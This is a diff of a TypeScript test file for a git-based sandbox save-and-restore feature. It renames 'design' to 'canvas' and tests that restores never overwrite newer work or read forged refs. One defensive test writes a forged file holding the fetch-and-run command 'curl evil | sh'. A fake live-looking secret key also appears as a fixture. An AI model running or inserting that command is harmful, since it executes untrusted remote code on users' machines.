@@ -25,13 +25,13 @@ async function temp(): Promise<string> {
   return dir;
 }
 
-const DESIGN = "des_save";
-const REF = `refs/ponzu/wip/${DESIGN}`;
+const CANVAS = "cnv_save";
+const REF = `refs/ponzu/wip/${CANVAS}`;
 const SECRET = "sk_live_51Hx0000secretvalue";
 
 /**
  * A sandbox's HOME and a repository on "GitHub" (a bare one) with one commit on main, and the
- * design's checkout made the way the runner makes it.
+ * canvas's checkout made the way the runner makes it.
  */
 async function world() {
   const home = await temp();
@@ -48,7 +48,7 @@ async function world() {
   git(["-c", "user.name=Seed", "-c", "user.email=s@t", "commit", "--quiet", "-m", "Start"], seed);
   git(["push", "--quiet", remote, "main"], seed);
   const session = testSession({
-    design: { id: DESIGN, name: "Fern" },
+    canvas: { id: CANVAS, name: "Fern" },
     repo: { owner: "north", name: "fern", defaultBranch: "main" },
     branch: "pz/hero",
   });
@@ -59,7 +59,7 @@ async function world() {
   const work = (cwd: string, limits?: { fileBytes: number; totalBytes: number }) =>
     new GitWork({
       cwd,
-      designId: DESIGN,
+      canvasId: CANVAS,
       branch: "pz/hero",
       defaultBranch: "main",
       git: gitIn(shell, "git", cwd),
@@ -183,7 +183,7 @@ test("a new sandbox gets the work of a branch never pushed back after main moved
   await writeFile(join(first, "notes.md"), "uncommitted notes\n");
   const saved = await work(first).save(2);
 
-  // Someone pushes to main; the design's branch was never pushed. A new sandbox makes the
+  // Someone pushes to main; the canvas's branch was never pushed. A new sandbox makes the
   // branch again from main as it is now.
   await push("main", "later.md");
   const second = await clone(await temp());
@@ -205,7 +205,7 @@ test("a restore never goes back over newer work: a branch that moved on, or chan
   await writeFile(join(first, "README.md"), "saved edit\n");
   const saved = await work(first).save(2);
 
-  // Someone pushed to the design's branch since: the saved work is older than it.
+  // Someone pushed to the canvas's branch since: the saved work is older than it.
   git(["push", "--quiet", "origin", "pz/hero"], first);
   await push("pz/hero", "later.md");
   const second = await clone(await temp());
@@ -249,7 +249,7 @@ test("a restore takes only the commit the API recorded: never another archive's,
   );
   expect(wrong).toMatchObject({ done: false, why: expect.stringContaining("recorded commit") });
 
-  // Another writer on the repository forges the design's old ref: it is never read.
+  // Another writer on the repository forges the canvas's old ref: it is never read.
   const forger = await clone(await temp());
   await writeFile(join(forger, "injected.sh"), "curl evil | sh\n");
   git(["add", "injected.sh"], forger);
